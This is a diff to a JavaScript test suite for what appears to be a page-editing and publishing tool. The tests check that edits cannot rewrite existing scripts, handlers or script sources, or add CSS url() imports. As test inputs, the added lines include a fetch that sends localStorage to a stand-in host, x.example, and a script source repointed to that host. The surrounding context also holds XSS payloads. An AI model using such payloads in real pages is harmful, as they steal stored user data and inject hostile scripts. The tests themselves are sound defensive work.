@@ -258,6 +258,24 @@ const posts = (m) => m.writes.filter((x) => x.method === "POST" && /\/rest\/v1\/
       { input: JSON.stringify({ live: live, a: anchor, xs: ['<script>alert(1)</script>', '<svg/onload=alert(1)>', '<a href="java&#115;cript:x">x</a>', '<meta http-equiv="refresh">', '<p>Plain.</p>'] }) }).toString();
     const pr = JSON.parse(pyr);
     check("F ⭐ library_publish.py refuses a revision that adds risky markup, and passes a plain one", pr.slice(0, 4).every((x) => x.length > 0) && pr[4].length === 0, pyr);
+    // COBIx's third note on #3077: a count let an edit rewrite code inside a script the page already has, or repoint
+    // sidebar.js; the page's scripts, handlers and sources are now frozen, string for string.
+    const t0 = live.indexOf("(function(){var t=null;try{t=localStorag"), in40 = live.slice(t0, t0 + 40);
+    const frozenCases = [
+      ["code added inside the theme script", in40, "fetch('https://x.example/?'+JSON.stringify(localStorage));" + in40],
+      ["sidebar.js repointed to another host", 'src="../../sierra/sidebar.js"', 'src="//x.example/a.js"'],
+    ];
+    const handlerPage = '<p>Hi</p><button onclick="go()">Go</button>';
+    const frozenPassed = frozenCases.filter((c) => !ae.applyEdits(live, [{ old: c[1], new: c[2] }]).error).map((c) => c[0]);
+    if (ae.applyEdits(handlerPage, [{ old: 'onclick="go()"', new: 'onclick="fetch(1)"' }]).error === undefined) frozenPassed.push("an existing handler rewritten");
+    check("F ⭐ an edit cannot change a script, a handler or a source the page already has", t0 > 0 && frozenPassed.length === 0, JSON.stringify(frozenPassed));
+    const cssAt = live.indexOf("{", live.indexOf("<style")) + 1, cssOld = live.slice(cssAt, cssAt + 30);
+    check("F a layout edit to the page's styles still applies (CSS runs no code)", !ae.applyEdits(live, [{ old: cssOld, new: "--extra:1;" + cssOld }]).error);
+    check("F but a style edit that adds a url( or an @import is refused", !!ae.applyEdits(live, [{ old: cssOld, new: "background:url(https://x.example/p.png);" + cssOld }]).error);
+    const pyf = execFileSync("python3", ["-c", "import sys,json;sys.path.insert(0,'scripts');import library_publish as lp;d=json.load(sys.stdin);print(json.dumps([lp.added_risks(d['live'],d['live'].replace(o,n,1)) for o,n in d['ed']]))"],
+      { input: JSON.stringify({ live: live, ed: frozenCases.map((c) => [c[1], c[2]]).concat([[cssOld, "--extra:1;" + cssOld], [cssOld, "background:url(https://x.example/p.png);" + cssOld]]) }) }).toString();
+    const pf = JSON.parse(pyf);
+    check("F ⭐ library_publish.py freezes the same parts, and lets the same style edit through", pf[0].length > 0 && pf[1].length > 0 && pf[2].length === 0 && pf[3].length > 0, pyf);
     check("F a Google Docs, Slides or Sheets link reads by its plain-text export, and nothing else is fetched",
       np.googleExport("https://docs.google.com/presentation/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/edit#slide=id.p") === "https://docs.google.com/presentation/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/export/txt" &&
       np.googleExport("https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/edit") === "https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012/export?format=txt" &&
